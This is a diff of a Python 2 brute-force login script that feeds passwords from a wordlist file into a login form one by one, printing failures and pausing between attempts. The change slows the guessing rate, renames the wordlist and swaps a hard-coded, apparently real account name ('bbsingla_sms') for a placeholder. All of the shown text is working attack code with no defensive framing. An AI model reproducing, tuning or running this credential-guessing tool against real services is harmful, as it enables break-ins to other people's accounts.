@@ -26,15 +26,15 @@ def logger(user,passer):
             exit(0)
         else:
             print '[-]Failed!! ' + passer + '\n'
-            time.sleep(0.3)
+            time.sleep(0.5)
             br.back()
     except:
         pass
- 
+
 def main():
-    user = 'bbsingla_sms'
+    user = 'USERNAME' #specify username here
     passer = ''
-    passFile = open('password1.txt', 'r')
+    passFile = open('password.txt', 'r') #name of password list in home directory
     for line in passFile.readlines():
         passer = line.strip('\n')
         logger(user,passer)
